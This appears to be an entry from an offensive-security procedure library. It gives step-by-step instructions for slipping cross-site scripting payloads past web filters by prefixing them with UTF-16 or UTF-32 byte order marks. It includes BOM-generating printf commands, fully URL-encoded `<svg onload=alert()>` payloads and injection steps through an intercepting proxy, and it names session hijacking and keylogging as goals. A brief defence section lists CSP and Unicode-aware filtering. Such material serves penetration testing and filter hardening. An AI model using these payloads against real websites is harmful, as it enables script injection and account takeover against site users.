---
id: 567bdce0-ba68-42d4-82fe-6773a01607b5
name: Bypassing-XSS-Filters-Using-UTF-BOM-Character
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:43.129415+00:00'
updated_at: '2023-10-01T00:00:00Z'
tactics:
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - '[[techniques/JavaScript|T1059.007 - JavaScript]]'
  - >-
    [[techniques/Obfuscated Files or Information|T1027 - Obfuscated Files or
    Information]]
sub_techniques: []
tags:
  - '[[tags/Bypass using BOM]]'
  - '[[tags/Cross Site Scripting]]'
  - '[[tags/Filter Bypass and exotic payloads]]'
commands:
  - '[[commands/output-utf16-big-endian-bom]]'
  - '[[commands/output-utf16-little-endian-bom]]'
  - '[[commands/output-utf16-xss-payload]]'
  - '[[commands/output-utf32-big-endian-bom]]'
  - '[[commands/output-utf32-little-endian-bom]]'
  - '[[commands/output-utf32-xss-payload]]'
platforms:
  - Web
tools: []
validated: true
---

# Bypassing-XSS-Filters-Using-UTF-BOM-Character

## Summary

This procedure demonstrates how to bypass web application XSS filters by prepending a Unicode Byte Order Mark (BOM) character to an XSS payload. The BOM, used in UTF-16 and UTF-32 encodings, can disrupt filters that do not properly handle Unicode byte sequences, allowing the payload to execute JavaScript such as an alert. This is useful in scenarios where standard XSS payloads are blocked, providing an obfuscation technique for filter evasion.

## Description

The Byte Order Mark (BOM) is a Unicode character (U+FEFF) that indicates the byte order for UTF-16 or UTF-32 encoded text. When prepended to an XSS payload like `<svg onload=alert()>` and URL-encoded appropriately, it alters the payload's appearance to simplistic filters, which may strip or block common patterns but overlook the BOM prefix. This technique targets filters lacking robust Unicode normalization or decoding. It is effective against legacy web applications or misconfigured WAFs. Success depends on the target's encoding expectations and filter implementation; testing multiple BOM variants (big/little endian) is often required. In an attack scenario, this enables execution of malicious JavaScript for session hijacking, keylogging, or further exploitation.

## Requirements

1. Access to a web application input field vulnerable to reflected or stored XSS.
2. Knowledge of the application's character encoding and filter behavior (e.g., via error messages or trial payloads).
3. A tool like Burp Suite or browser developer tools to intercept, modify, and inject payloads.
4. Basic understanding of URL encoding and Unicode (UTF-16/UTF-32).

## Defense

- Implement strict input validation and output encoding using libraries like OWASP ESAPI or HTML entity encoding to normalize Unicode inputs.
- Deploy a Web Application Firewall (WAF) with Unicode-aware rules to detect and block anomalous byte sequences in payloads.
- Enforce Content Security Policy (CSP) headers to restrict inline script execution, mitigating XSS even if filters fail.
- Regularly audit and update filters to handle BOM and other encoding bypasses; use tools like OWASP ZAP for testing.

## Objectives

1. Obfuscate an XSS payload to evade character-based filters.
2. Achieve JavaScript execution on the target page.
3. Demonstrate filter bypass for further payload delivery (e.g., data exfiltration).
4. Validate the vulnerability for reporting or exploitation.

## Instructions

### Step 1: Identify the Vulnerable Input and Test Basic XSS

**Context**: Confirm the input field allows XSS but blocks standard payloads, setting the stage for BOM obfuscation. Use a simple alert payload to baseline filter behavior.

Navigate to the target input (e.g., search box, comment form) and submit `<script>alert(1)</script>`. If blocked, note the rejection pattern (e.g., script tags stripped).

**Expected Output**: If vulnerable, an alert box pops up; if filtered, no execution with possible error or sanitized output.

### Step 2: Select Encoding and Generate BOM Prefix

**Context**: Choose UTF-16 or UTF-32 based on target support (UTF-16 is more common). Generate the BOM bytes using endian-specific commands to prepend to the payload.

For UTF-16 Big Endian, use [[commands/output-utf16-big-endian-bom]]:

```bash
printf '\xFE\xFF'
```

> This outputs the BOM bytes: 0xFE 0xFF. Append your base payload bytes (e.g., for `<svg onload=alert()>`, encode as UTF-16: 00 3C 00 73 00 76 00 67 00 2F 00 6F 00 6E 00 6C 00 6F 00 61 00 64 00 3D 00 61 00 6C 00 65 00 72 00 74 00 28 00 29 00 3E).

For UTF-16 Little Endian, use [[commands/output-utf16-little-endian-bom]]:

```bash
printf '\xFF\xFE'
```

> Outputs: 0xFF 0xFE. Adjust payload bytes accordingly (reverse byte order).

For UTF-32 Big Endian, use [[commands/output-utf32-big-endian-bom]]:

```bash
printf '\x00\x00\xFE\xFF'
```

> Outputs: 0x00 0x00 0xFE 0xFF.

For UTF-32 Little Endian, use [[commands/output-utf32-little-endian-bom]]:

```bash
printf '\xFF\xFE\x00\x00'
```

> Outputs: 0xFF 0xFE 0x00 0x00.

**Expected Output**: Raw bytes for the BOM prefix, ready to combine with payload.

**Success Indicators**:
- BOM bytes generated without errors.
- Bytes match expected hex values.

### Step 3: Construct and URL-Encode the Full Payload

**Context**: Combine BOM with the XSS payload and URL-encode for HTTP transmission. This step creates the injectable string.

Use a base payload like `<svg onload=alert()>` encoded in the chosen UTF variant, prepend BOM, then URL-encode the entire byte sequence.

For UTF-16 (Big Endian) XSS payload, use [[commands/output-utf16-xss-payload]]:

```bash
echo -n '%fe%ff%00%3C%00s%00v%00g%00/%00o%00n%00l%00o%00a%00d%00=%00a%00l%00e%00r%00t%00(%00)%00%3E'
```

> This outputs the URL-encoded string: %fe%ff%00%3C%00s%00v%00g%00/%00o%00n%00l%00o%00a%00d%00=%00a%00l%00e%00r%00t%00(%00)%00%3E.

For UTF-32 (Big Endian) XSS payload, use [[commands/output-utf32-xss-payload]]:

```bash
echo -n '%00%00%fe%ff%00%00%00%3C%00%00%00s%00%00%00v%00%00%00g%00%00%00/%00%00%00o%00%00%00n%00%00%00l%00%00%00o%00%00%00a%00%00%00d%00%00%00=%00%00%00a%00%00%00l%00%00%00e%00%00%00r%00%00%00t%00%00%00(%00%00%00)%00%00%00%3E'
```

> Outputs the URL-encoded UTF-32 variant.

If the target expects different endianness, swap and re-encode.

**Expected Output**: URL-encoded payload string ready for injection (e.g., %fe%ff%00%3C...).

**Success Indicators**:
- Encoded string includes BOM prefix and readable payload.
- No encoding errors in output.

### Step 4: Inject Payload and Verify Execution

**Context**: Submit the encoded payload via the vulnerable input and observe if the filter bypasses, leading to JavaScript execution.

Intercept the request using a proxy like Burp Suite, replace the parameter value with the encoded payload, and forward. Refresh or submit to trigger reflection/storage.

If using direct browser input, paste the decoded bytes if possible, or use JavaScript console to set innerHTML.

**Expected Output**: Successful bypass shows the alert() executing without filter interference; inspect page source to confirm BOM presence.

**Success Indicators**:
- Alert box appears on page load/submission.
- No filter rejection or sanitization of the payload.
- Network logs show the payload transmitted with BOM intact.
